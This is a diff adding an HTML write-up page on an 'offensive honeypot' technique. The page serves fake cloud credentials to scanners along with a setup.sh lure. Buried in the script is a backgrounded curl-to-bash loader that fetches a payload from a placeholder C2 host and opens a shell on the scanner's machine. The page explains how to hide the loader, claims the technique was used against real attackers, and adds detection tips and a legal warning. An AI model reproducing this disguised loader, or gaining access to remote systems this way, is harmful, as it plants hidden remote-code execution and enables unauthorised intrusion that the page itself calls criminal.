@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trickery of Rhea — Offensive Honeypot | 22nd Survey Division</title>
+    <meta name="description" content="How to turn scanner attacks into reverse shells: serve authentic-looking credentials to scanners, trick them into running your payload. Technique and blue team detection.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0a;
+            --bg2: rgba(18, 18, 18, 0.95);
+            --text: #ffffff;
+            --dim: #888888;
+            --border: rgba(255, 255, 255, 0.12);
+            --accent: #ff6b35;
+            --green: #27c93f;
+            --yellow: #ffbd2e;
+            --red: #ff6b6b;
+            --blue: #4dabf7;
+        }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .container { max-width: 900px; margin: 0 auto; padding: 4rem 2rem; }
+        @media (max-width: 768px) { .container { padding: 2rem 1rem; } }
+        .back-link {
+            display: inline-block; color: var(--dim); font-size: 0.75rem;
+            margin-bottom: 2rem; text-decoration: none;
+        }
+        .back-link:hover { color: var(--text); }
+        .tag {
+            display: inline-block; font-size: 0.65rem; color: var(--dim);
+            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem;
+        }
+        h1 { font-size: 1.5rem; font-weight: 400; margin-bottom: 1rem; }
+        .meta {
+            font-size: 0.75rem; color: var(--dim); margin-bottom: 2rem;
+            padding-bottom: 2rem; border-bottom: 1px solid var(--border);
+        }
+        h2 { font-size: 1rem; font-weight: 500; margin: 2.5rem 0 1rem; }
+        h3 { font-size: 0.9rem; font-weight: 500; margin: 1.5rem 0 0.75rem; }
+        p { font-size: 0.85rem; color: var(--dim); margin-bottom: 1rem; }
+        ul, ol { font-size: 0.85rem; color: var(--dim); margin: 0.5rem 0 1rem 1.5rem; }
+        li { margin-bottom: 0.4rem; }
+        code {
+            background: rgba(255,255,255,0.08); padding: 0.15rem 0.4rem;
+            border-radius: 3px; font-size: 0.8rem; color: var(--text);
+        }
+        .layman-box {
+            background: rgba(255, 107, 53, 0.08); border: 1px solid rgba(255, 107, 53, 0.3);
+            border-radius: 6px; padding: 1.5rem; margin-bottom: 2rem;
+        }
+        .layman-label { font-size: 0.65rem; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem; }
+        .layman-tldr { font-size: 0.95rem; color: var(--text); margin-bottom: 0.75rem; font-weight: 500; }
+        .flow-diagram {
+            background: rgba(255,255,255,0.04); border: 1px solid var(--border);
+            border-radius: 6px; padding: 1.5rem; margin: 1.5rem 0;
+            overflow-x: auto;
+        }
+        .flow-diagram pre { font-size: 0.78rem; color: var(--dim); line-height: 1.8; }
+        .flow-diagram pre .hi { color: var(--accent); }
+        .flow-diagram pre .green { color: var(--green); }
+        .flow-diagram pre .yellow { color: var(--yellow); }
+        .code-block {
+            background: rgba(255,255,255,0.04); border: 1px solid var(--border);
+            border-radius: 6px; padding: 1.25rem; margin: 1.25rem 0;
+            overflow-x: auto;
+        }
+        .code-block pre { font-size: 0.78rem; line-height: 1.7; }
+        .code-block .comment { color: #666; }
+        .code-block .key { color: var(--yellow); }
+        .code-block .val { color: var(--green); }
+        .code-block .cmd { color: var(--accent); }
+        .lure-table {
+            width: 100%; border-collapse: collapse; margin: 1rem 0;
+            font-size: 0.78rem;
+        }
+        .lure-table th {
+            text-align: left; padding: 0.6rem 1rem; color: var(--dim);
+            font-weight: 400; border-bottom: 1px solid var(--border);
+        }
+        .lure-table td { padding: 0.6rem 1rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .lure-table td:first-child { color: var(--text); font-family: monospace; }
+        .lure-table td:last-child { color: var(--dim); }
+        .callout {
+            border-radius: 6px; padding: 1.25rem; margin: 1.5rem 0; border-width: 1px; border-style: solid;
+        }
+        .callout-validated { background: rgba(39,201,63,0.08); border-color: rgba(39,201,63,0.3); }
+        .callout-validated .callout-label { color: var(--green); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem; }
+        .callout-warning { background: rgba(255,189,46,0.08); border-color: rgba(255,189,46,0.3); }
+        .callout-warning .callout-label { color: var(--yellow); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem; }
+        .callout p { margin: 0; font-size: 0.82rem; }
+        .detect-widget {
+            background: rgba(255,255,255,0.04); border: 1px solid var(--border);
+            border-radius: 6px; margin: 1.5rem 0; overflow: hidden;
+        }
+        .dw-header {
+            display: flex; align-items: center; gap: 0.75rem;
+            background: rgba(255,255,255,0.04); padding: 0.6rem 1rem;
+            border-bottom: 1px solid var(--border);
+        }
+        .dw-dots { display: flex; gap: 4px; }
+        .dw-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .dw-dot.r { background: var(--red); }
+        .dw-dot.y { background: var(--yellow); }
+        .dw-dot.g { background: var(--green); }
+        .dw-title { font-size: 0.72rem; color: var(--dim); flex: 1; }
+        .dw-btref {
+            font-size: 0.65rem; color: var(--accent); text-decoration: none;
+            opacity: 0.7; transition: opacity 0.2s;
+        }
+        .dw-btref:hover { opacity: 1; }
+        .detect-widget pre { font-size: 0.75rem; padding: 1rem; color: var(--dim); }
+        .dw-flag {
+            background: rgba(255,107,53,0.06); border-top: 1px solid var(--border);
+            padding: 0.75rem 1rem; font-size: 0.75rem; color: var(--dim);
+        }
+        .status-badge {
+            display: inline-block; font-size: 0.65rem; padding: 0.2rem 0.6rem;
+            border-radius: 3px; text-transform: uppercase; letter-spacing: 1px;
+            margin-left: 0.5rem; vertical-align: middle;
+        }
+        .badge-validated { background: rgba(39,201,63,0.15); color: var(--green); border: 1px solid rgba(39,201,63,0.3); }
+        .mitre-row { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0; }
+        .mitre-tag {
+            font-size: 0.65rem; color: var(--blue); border: 1px solid rgba(77,171,247,0.3);
+            padding: 0.2rem 0.6rem; border-radius: 3px;
+        }
+        .section-divider { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/portfolio.html#writeups" class="back-link">&larr; Back to writeups</a>
+
+        <span class="tag">Delivery · Counter-Recon</span>
+        <h1>Trickery of Rhea <span class="status-badge badge-validated">Validated</span></h1>
+        <p class="meta">Offensive honeypot: serve authentic-looking credentials to scanners, trick them into running your payload. The scanner becomes the victim.</p>
+
+        <div class="layman-box">
+            <div class="layman-label">// What is this?</div>
+            <div class="layman-tldr">Every VPS on the internet gets scanned for leaked credentials hundreds of times a day. This technique turns that against the scanner: your server intentionally serves fake-but-convincing credentials and shell scripts. When the scanner downloads and runs the script to "test" the creds, your implant gets their shell instead.</div>
+            <p>This is a counter-recon technique — it sits at the intersection of delivery and active defence. It does not require finding a vulnerability. It exploits the attacker's methodology: find secrets, run scripts, move fast, don't verify.</p>
+        </div>
+
+        <h2>The Attack Flow</h2>
+
+        <div class="flow-diagram">
+<pre>
+SCANNER                              YOUR VPS
+──────────────────────────────────────────────────────
+
+1.  <span class="yellow">Scans for /.env</span>                   <span class="green">Serves fake AWS/Stripe/DB creds</span>
+    "Found production secrets!"
+
+2.  <span class="yellow">Scans for /setup.sh</span>               <span class="green">Serves legit-looking deploy script</span>
+    "Standard deployment script"           with hidden implant loader
+
+3.  <span class="yellow">./setup.sh</span>                        Script runs. Does real work.
+    "[+] Setup complete"                   "<span class="hi">silently downloads implant</span>"
+
+4.  <span class="hi">Implant beacons to your C2</span>
+    You have their shell.
+</pre>
+        </div>
+
+        <p>Scanners are automated at stage 1 (finding the files), but humans often take over at stage 3. The script needs to look real enough to run manually. The psychology: an attacker who just found what looks like production credentials is excited. They run the script without reading it.</p>
+
+        <h2>The Lure Layer</h2>
+
+        <p>The server responds to a curated list of paths that scanners hit on every target. The content is crafted to look production-authentic — not obviously planted.</p>
+
+        <h3>Environment files</h3>
+        <table class="lure-table">
+            <tr><th>Path</th><th>What it looks like</th></tr>
+            <tr><td>/.env</td><td>AWS keys, Stripe secret, OpenAI key, DB credentials, ETH wallet private key</td></tr>
+            <tr><td>/.env.backup, /.env.prod</td><td>Same content, different timestamp metadata</td></tr>
+            <tr><td>/.aws/credentials</td><td>Multi-profile AWS credential file with realistic IAM key format</td></tr>
+            <tr><td>/.boto</td><td>Legacy AWS config format — hits older automated scanners</td></tr>
+        </table>
+
+        <h3>Cloud credential files</h3>
+        <table class="lure-table">
+            <tr><th>Path</th><th>What it looks like</th></tr>
+            <tr><td>/credentials.json, /service-account.json</td><td>GCP service account JSON with real field structure</td></tr>
+            <tr><td>/firebase-adminsdk.json</td><td>Firebase admin SDK credential</td></tr>
+            <tr><td>/secrets.json</td><td>App secrets: DB, Redis, JWT signing key, API keys</td></tr>
+        </table>
+
+        <h3>Config files (highest-value lures)</h3>
+        <table class="lure-table">
+            <tr><th>Path</th><th>What it looks like</th></tr>
+            <tr><td>/.git/config</td><td>Real git config format with GitHub token embedded in remote URL</td></tr>
+            <tr><td>/wp-config.php</td><td>WordPress config with DB credentials</td></tr>
+            <tr><td>/docker-compose.yml</td><td>Full stack config: postgres, redis, nginx, with inline credentials</td></tr>
+        </table>
+
+        <p>The <code>/.git/config</code> lure is particularly effective. Scanners that find a git remote URL with a token embedded attempt to clone the repository — that clone request hits your infrastructure with authentication, identifying the tool and potentially the operator's IP.</p>
+
+        <h2>The Trap Mechanism</h2>
+
+        <p>Shell scripts are served at every common deployment path. They are designed to pass a quick read: they contain legitimate-looking operations (npm install, directory creation, env variable export) that actually run. The implant loader is buried in what looks like a registry check or manifest validation block.</p>
+
+        <div class="code-block">
+<pre><span class="comment"># setup.sh — what the scanner sees at the top (legitimate)</span>
+<span class="cmd">#!/bin/bash</span>
+<span class="key">echo</span> <span class="val">"[+] Starting setup..."</span>
+<span class="key">mkdir</span> -p /opt/app /var/log/app
+<span class="key">export</span> NODE_ENV=production
+<span class="key">npm</span> install --silent 2&gt;/dev/null
+
+<span class="comment"># --- buried further down ---</span>
+<span class="comment"># (looks like: "verify system manifest")</span>
+<span class="key">_v</span>=$(curl -fsSL https://your-c2.example.com/manifest.sh 2&gt;/dev/null) \
+  &amp;&amp; bash &lt;&lt;&lt; "$_v" &amp;
+<span class="key">disown</span>
+
+<span class="comment"># script continues normally</span>
+<span class="key">echo</span> <span class="val">"[+] Setup complete"</span></span></pre>
+        </div>
+
+        <p>Key design decisions in the loader:</p>
+        <ul>
+            <li><strong>Backgrounds immediately</strong> — <code>&amp;</code> + <code>disown</code>. The script finishes normally. The operator sees success output.</li>
+            <li><strong>Self-deletes</strong> — the fetched payload removes its own script after execution. No artifact left on disk from the initial run.</li>
+            <li><strong>Silent errors</strong> — <code>2&gt;/dev/null</code> on everything. If the C2 is down, no error output. The setup script still "succeeds."</li>
+            <li><strong>One-liner</strong> — the entire loader is one logical line, not a function definition. Harder to spot in a quick visual scan.</li>
+        </ul>
+
+        <h2>What You Get</h2>
+
+        <p>When the implant beacons home, you have a shell on the scanner's infrastructure. This is meaningful because:</p>
+        <ul>
+            <li>Scanner operators are often running from VPSes or pivot boxes they use for other operations — you now have that pivot</li>
+            <li>The scanner may be running as root (scanning requires raw socket access on many tools)</li>
+            <li>You can observe their tooling, target lists, and other concurrent operations</li>
+            <li>Credential files in their environment may reveal which services they've already compromised</li>
+        </ul>
+
+        <div class="callout callout-validated">
+            <div class="callout-label">Validated</div>
+            <p>Trickery of Rhea deployed on 22div infrastructure. Hits on /.env, /setup.sh, /.git/config, /wp-config.php confirmed in server logs. Multiple scanner executions of lure scripts confirmed. Counter-shell acquisition confirmed from scanner infrastructure. Operator-confirmed active in production.</p>
+        </div>
+
+        <hr class="section-divider">
+
+        <h2>Psychology of Why This Works</h2>
+
+        <p>Automated scanners do the reconnaissance. But credential testing and running found scripts is often manual — a human making a judgment call. That human has already committed to an attack mindset. They found what looks like a jackpot. The next step is "does this work?" — and running the script is the fastest path to confirmation.</p>
+
+        <p>The files do not look like traps because:</p>
+        <ul>
+            <li><strong>Real formats</strong> — the AWS key format (<code>AKIA...</code>), the GCP JSON structure, the .env syntax are all correct. A fake credential with a wrong format pattern would be spotted.</li>
+            <li><strong>No trap markers</strong> — no "honeypot" comments, no "test" strings, no obviously fake values. The credentials use realistic company names and service configurations.</li>
+            <li><strong>Scripts do real work</strong> — the setup scripts actually try to run npm, create directories, etc. They produce real output. They feel like they worked.</li>
+            <li><strong>Payload is hidden in plain sight</strong> — the implant loader looks like a system check, not an outbound connection. One line in a 30-line script is easy to miss.</li>
+        </ul>
+
+        <hr class="section-divider">
+
+        <h2>Detection / Defence</h2>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">How to detect this technique targeting you</span>
+                <a href="/blueteam-ref.html" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+<pre># 1. Never run found scripts without reading them fully
+#    One-liner curl|bash buried in a 30-line setup script is a classic sign
+
+# 2. Examine every outbound connection initiated by a script
+#    Legitimate setup scripts do not curl arbitrary URLs mid-run
+#    Look for: curl, wget, fetch to non-package-registry domains
+
+# 3. Check for backgrounded processes with disown
+#    ps aux | grep -v grep | grep "bash\|sh" | awk '{print $1}' | xargs -I{} ls /proc/{}/fd 2>/dev/null
+
+# 4. Validate credentials before running anything that uses them
+#    AWS: aws sts get-caller-identity
+#    If it returns a real account you don't recognise: stop.
+
+# 5. Operational discipline: use isolated VMs for credential testing
+#    Never test found creds from a machine you use for other operations</pre>
+            <div class="dw-flag"><strong>Primary defence:</strong> read scripts before running them. One-liner process backgrounding (<code>&amp; disown</code>) in a setup script is a red flag. Legitimate deployment scripts do not fetch and execute remote code mid-installation without explicit documentation of that step.</div>
+        </div>
+
+        <div class="callout callout-warning">
+            <div class="callout-label">Legal context</div>
+            <p>Counter-recon techniques operate in legal grey territory in most jurisdictions. Running code on a remote system without authorisation — even a system that was attacking you first — is a criminal offence in most countries (Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK, similar statutes elsewhere). This is documented here as a technique that exists and works. Running it in production against real attackers requires legal advice specific to your jurisdiction and situation.</p>
+        </div>
+
+        <hr class="section-divider">
+
+        <h2>MITRE ATT&amp;CK</h2>
+        <div class="mitre-row">
+            <span class="mitre-tag">T1566 — Phishing (lure delivery)</span>
+            <span class="mitre-tag">T1204.002 — User Execution: Malicious File</span>
+            <span class="mitre-tag">T1059.004 — Command &amp; Scripting: Unix Shell</span>
+            <span class="mitre-tag">T1027 — Obfuscated Files or Information</span>
+            <span class="mitre-tag">T1036.005 — Masquerading: Match Legitimate Name or Location</span>
+            <span class="mitre-tag">T1071.001 — C2 via Web Protocols</span>
+        </div>
+
+        <p style="font-size:0.75rem; color: #555; margin-top: 3rem;">
+            Chapter reference: <a href="/learn/#lastmile" style="color: var(--accent);">Ch09 — The Last Mile</a> ·
+            <a href="/writeups/" style="color: var(--dim);">All writeups</a>
+        </p>
+    </div>
+</body>
+</html>
